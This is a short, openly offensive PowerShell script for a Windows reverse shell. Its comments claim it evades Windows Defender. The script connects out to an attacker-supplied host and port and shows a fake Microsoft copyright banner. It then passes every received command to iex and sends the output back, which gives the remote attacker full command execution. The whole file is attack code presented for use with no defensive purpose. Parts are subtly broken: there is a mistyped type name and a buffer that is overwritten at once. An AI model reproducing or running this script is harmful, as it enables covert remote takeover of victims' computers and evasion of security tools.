# Powershell script to create reverse shell on windows system 
# This also voids the windows defender system unlike some other attempts at a reverse shell

# Create a new connection at ip address and root 
$c = New-Object System.Net.Sockets.TCPClient($args[0],$args[1]);
# Create a client stream to read and write to the connection
$I = $c.GetStream();
# Creating a buffer for the incoming commands from the attacker
[byter[]]$U = 0..(2-shl15) | %{0};
$U = ([text.encoding]::ASCII).getBytes("Copyright (C) 2021 Microsoft Corporation. All rights reserved. `n`n")
# Writing output to client stream 
$I.Write($U,0,$U.Length)
# Get location of Path Directory and encode in ASCII
$U = ([text.encoding]::ASCII).GetBytes((Get-Location).Path + '>')
$I.Write($U,0,$U.Length)
# While the attacker is still sending commands to the targeted computer keep the connection
while(($k = $I.Read($U, 0, $U.Length)) -ne 0) {
  ;$D = (New-Object System.Text.UTF8Encoding).GetString($U,0, $k);
  # Evaluate the expression given being a command from the attacker and
  # Create stdin and stderr for the reverse shell and produce as an output string
  $a = (iex $D 2>&1 | Out-String );
  # Add the command to the current directories path and 
  # Add the Path of the system in the current dir to the reverse shell
  $r  = $a + (pwd).Path + '> ';
  $m = ([text.encoding]::ASCII).GetBytes($r);
  # Write the command to the terminal
  $I.Write($m,0,$m.Length);
  $I.Flush()
};
# Close the connection after the Attackers connection has closed
$c.Close()
